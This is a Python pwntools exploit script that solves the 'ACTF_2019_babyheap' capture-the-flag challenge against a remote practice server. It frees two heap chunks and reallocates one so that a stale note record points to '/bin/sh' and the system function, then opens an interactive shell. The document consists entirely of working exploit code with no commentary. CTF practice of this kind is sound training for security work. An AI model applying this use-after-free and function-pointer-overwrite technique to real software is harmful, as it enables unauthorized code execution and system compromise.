from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('ACTF_2019_babyheap')
io = remote('node4.buuoj.cn', 25246)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('libc-2.27.so')
elf = ELF('ACTF_2019_babyheap')
system = elf.plt['system']
bin_sh = 0x602010

def add(size, content):
    io.sendlineafter('Your choice: ', '1')
    io.sendlineafter('Please input size: \n', str(size))
    io.sendafter('Please input content: \n', content)


def delete(index):
    io.sendlineafter('Your choice: ', '2')
    io.sendlineafter('Please input list index: \n', str(index))


def show(index):
    io.sendlineafter('Your choice: ', '3')
    io.sendlineafter('Please input list index: \n', str(index))


def pwn():
    add(0x20, cyclic(0x20))
    add(0x20, cyclic(0x20))
    delete(0)
    delete(1)
    add(0x10, p64(bin_sh) + p64(system))
    show(0)
    io.interactive()


if __name__ == '__main__':
    pwn()
